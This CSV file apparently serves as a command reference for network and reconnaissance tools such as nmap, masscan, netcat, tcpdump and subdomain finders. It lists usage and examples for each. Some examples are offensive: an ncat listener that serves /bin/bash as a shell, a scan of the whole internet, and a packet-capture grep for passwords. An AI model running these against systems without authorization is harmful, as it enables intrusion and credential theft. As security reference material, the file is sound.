command,category,brief,description,usage,examples
nmap,network,Network exploration and security auditing,Nmap is a powerful network scanner for discovering hosts and services. Supports TCP SYN/Connect/ACK scans, version detection, OS fingerprinting, and NSE scripts.,"nmap [Scan Type(s)] [Options] {target specification}
Options:
  -sS: TCP SYN scan (stealth)
  -sT: TCP Connect scan
  -sV: Version detection
  -sC: Default scripts
  -O: OS detection
  -Pn: Skip host discovery
  -p: Port specification
  -A: Aggressive scan
  --script: Run NSE scripts","nmap -sV 192.168.1.1
nmap -sS -p 1-1000 target.com
nmap -A -T4 192.168.1.0/24
nmap --script vuln target.com"
masscan,network,High-speed internet port scanner,Masscan is the fastest port scanner - can scan the entire internet in under 6 minutes. Uses asynchronous transmission.,"masscan [options] <targets>
Options:
  -p: Port specification
  --rate: Packets per second
  -oL: Output list format
  --banners: Grab banners
  --adapter-ip: Source IP","masscan -p80,443 192.168.1.0/24
masscan -p1-65535 10.0.0.1 --rate=1000
masscan -p80 0.0.0.0/0 --rate=10000000"
netcat,network,TCP/UDP network read/write tool,Netcat (nc) is a versatile networking utility for reading and writing data across network connections. Useful for port scanning, file transfers, and reverse shells.,"nc [options] <host> <port>
Options:
  -l: Listen mode
  -v: Verbose
  -p: Local port
  -e: Execute command
  -u: UDP mode
  -z: Zero-I/O mode (scanning)","nc -lvp 4444
nc target.com 80
nc -z -v target.com 1-1000
echo 'GET /' | nc target.com 80"
nc,network,Netcat alias for network connections,Netcat alias. Same as netcat command.,"nc [options] <host> <port>
Options:
  -l: Listen mode
  -v: Verbose
  -p: Local port","nc -lvp 4444
nc target.com 80"
ncat,network,Nmap's enhanced netcat with SSL,Ncat is Nmap's reimplementation of netcat with SSL support, connection brokering, and proxying features.,"ncat [options] <host> <port>
Options:
  --ssl: Use SSL
  --proxy: Use proxy
  -e: Execute command
  --allow: Allow connections from hosts","ncat --ssl target.com 443
ncat -lvp 4444 -e /bin/bash
ncat --proxy proxy:8080 target.com 80"
curl,network,Transfer data with URLs,Command-line tool for transferring data using various protocols. Essential for web exploitation and API testing.,"curl [options] <URL>
Options:
  -X: Request method
  -d: POST data
  -H: Header
  -b: Cookie
  -o: Output file
  -v: Verbose
  -k: Insecure (skip SSL verify)","curl http://target.com
curl -X POST -d ""user=admin&pass=test"" http://target.com/login
curl -H ""Authorization: Bearer token"" http://target.com/api"
wget,network,Non-interactive network downloader,Downloads files from HTTP, HTTPS, and FTP servers. Supports recursive downloads.,"wget [options] <URL>
Options:
  -O: Output filename
  -r: Recursive download
  -q: Quiet
  --no-check-certificate: Skip SSL verify","wget http://target.com/file.zip
wget -O output.txt http://target.com/data
wget -r http://target.com/directory/"
tcpdump,network,Command-line packet analyzer,Captures and displays network traffic. Essential for network forensics and debugging.,"tcpdump [options]
Options:
  -i: Interface
  -r: Read from file
  -w: Write to file
  -n: Don't resolve names
  -A: ASCII output
  -X: Hex and ASCII","tcpdump -i eth0
tcpdump -r capture.pcap
tcpdump -i eth0 -w output.pcap
tcpdump -r capture.pcap -A | grep -i password"
tshark,network,Terminal Wireshark for protocol analysis,Terminal-based Wireshark. Captures and analyzes network traffic with powerful filtering.,"tshark [options]
Options:
  -i: Interface
  -r: Read file
  -Y: Display filter
  -T: Output format
  -e: Field to print","tshark -r capture.pcap
tshark -r capture.pcap -Y ""http""
tshark -r capture.pcap -Y ""http.request.method==POST"" -T fields -e http.file_data"
amass,network,Subdomain enumeration and network mapping,OWASP Amass performs network mapping by collecting information from various sources including APIs, DNS, and web scraping.,"amass enum [options] -d <domain>
Options:
  -d: Target domain
  -passive: Passive mode only
  -o: Output file
  -brute: Brute force","amass enum -d target.com
amass enum -passive -d target.com
amass enum -brute -d target.com -o subs.txt"
subfinder,network,Fast passive subdomain discovery,Subfinder discovers subdomains using passive online sources. Fast and efficient with multiple source support.,"subfinder [options] -d <domain>
Options:
  -d: Domain
  -dL: Domain list file
  -o: Output file
  -silent: Silent mode
  -all: Use all sources","subfinder -d target.com
subfinder -d target.com -o subs.txt
subfinder -dL domains.txt -o all_subs.txt"
httpx,network,Fast HTTP probing and fingerprinting,Httpx probes for web servers and extracts info like status codes, titles, and technologies. Multi-purpose HTTP toolkit.,"httpx [options]
Options:
  -l: Input list
  -u: Target URL
  -status-code: Show status
  -title: Show title
  -tech-detect: Detect tech
  -content-length: Show length","cat urls.txt | httpx
httpx -l urls.txt -status-code -title
cat subs.txt | httpx -tech-detect"
theharvester,network,Email and domain intelligence gathering,TheHarvester gathers emails, names, subdomains, IPs and URLs from public sources like search engines and PGP servers.,"theHarvester [options] -d <domain>
Options:
  -d: Domain
  -b: Data source (google, bing, etc.)
  -l: Limit results","theHarvester -d target.com -b google
theHarvester -d target.com -b all -l 500"
